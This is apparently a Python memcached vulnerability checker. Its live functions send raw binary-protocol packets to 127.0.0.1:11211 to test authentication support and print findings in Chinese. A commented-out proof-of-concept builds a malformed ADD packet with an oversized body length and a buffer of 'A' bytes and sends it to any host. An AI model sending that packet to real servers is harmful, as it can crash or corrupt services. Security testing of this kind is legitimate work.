import struct  
import socket  
import sys


# MEMCACHED_REQUEST_MAGIC = b"\x80"  
# OPCODE_ADD = b"\x02"
# key_len = struct.pack("!H",0xfa)  
# extra_len = b"\x08"  
# data_type = b"\x00"  
# vbucket = b"\x00\x00"  
# body_len = struct.pack("!I",0xffffffd0)  
# opaque = struct.pack("!I",0)  
# CAS = struct.pack("!Q",0)  
# extras_flags = 0xdeadbeef  
# extras_expiry = struct.pack("!I",0xe10)  
# body = "A"*1024
# body = body.encode(encoding="utf-8")


# # print(key_len)
# packet = MEMCACHED_REQUEST_MAGIC + OPCODE_ADD + key_len + extra_len  
# packet += data_type + vbucket + body_len + opaque + CAS  
# packet += body
# if len(sys.argv) != 3:
#         print("./poc_add.py <server> <port>")
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((sys.argv[1],int(sys.argv[2])))
# s.sendall(packet)  
# print(s.recv(1024))
# s.close()
def verify(host, port):
    ret = is_support_auth(host, port)
    if ret is True:
        scan_anth(host, port)
    elif ret is False:
        scan_no_auth(host, port)

def is_support_auth(host, port):
    try:
        soc = socket.create_connection((host, port), timeout=5)
        soc.settimeout(10)
        soc.send(bytes.fromhex('80210002000000000000000400000000000000000000000041414242'))
        ret = soc.recv(12)
    except Exception:
        return False
    if ret[0:2] == b'\x81!' and ret[6:8] == b'\x00 ':
        return True
    if ret[0:2] == b'\x81!' and ret[6:8] == b'\x00\x81':
        return False
    return False

def scan_anth(host, port):
    try:
        soc = socket.create_connection((host, port), timeout=5)
        soc.settimeout(5)
        check_packet = bytes.fromhex('80210002000000000000000000000000000000000000000002')
        soc.send(check_packet)
        ret = soc.recv(12)
        if len(ret) == 12 and ret[0:2] == b'\x81!':
            value_length = int(ret[8:12].hex())
            soc.recv(12)
            info = soc.recv(value_length)
            soc.close()
            return False
    except Exception:
        pass

    if is_support_auth(host, port):
        vuln_des = f"发送如下数据：\r\n{check_packet}\r\n收到的响应：\r\n{ret}"
        print(vuln_des)

def scan_no_auth(host, port):
    try:
        soc = socket.create_connection((host, port), timeout=5)
        soc.settimeout(5)
        check_packet = bytes.fromhex('800f0001000000000000000000000000000000000000000000')
        soc.send(check_packet)
        ret = soc.recv(12)
        if len(ret) == 12 and ret[0:2] == b'\x81\x0f':
            value_length = int(ret[8:12].hex(), 16)
            soc.recv(12)
            info1 = soc.recv(value_length)
            soc.close()
            return False
        vuln_des = f"发送如下数据：\r\n{check_packet}\r\n收到的响应：\r\n{ret}"
        print("noauth")
        print(vuln_des)
    except Exception:
        return False

verify("127.0.0.1", 11211)



